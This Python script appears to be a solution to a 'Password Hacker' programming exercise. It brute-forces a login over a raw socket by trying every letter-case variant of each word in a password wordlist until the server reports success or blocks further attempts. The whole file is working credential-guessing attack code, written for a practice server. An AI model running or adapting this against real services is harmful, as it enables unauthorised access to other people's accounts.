import itertools
import socket
import sys


def file_line_iterator(filename):
    with open(filename, 'r') as file:
        for line in file:
            yield line.strip()


host, port = sys.argv[1:]
address = (host, int(port))

with socket.socket() as sock:
    sock.connect(address)
    password_list = file_line_iterator(
        filename="/Users/akshitmehta/PycharmProjects/Password Hacker with Python/Password Hacker with Python/task/Stepik passwords.txt")
    found = False
    request_exceeded = False

    try:
        while True:
            password = next(password_list)
            letter_cases = [(letter.lower(), letter.upper()) for letter in password]
            for combination in map(lambda x: ''.join(x), itertools.product(*letter_cases)):
                sock.send(combination.encode())
                response = sock.recv(1024).decode().strip()

                if response == "Connection success!":
                    found = True
                    print(combination)
                    break
                elif response == "Too many attempts.":
                    request_exceeded = True
                    break

            if found or request_exceeded:
                break

    except StopIteration:
        pass

    if not found:
        print("Too many attempts or incorrect host/port.")
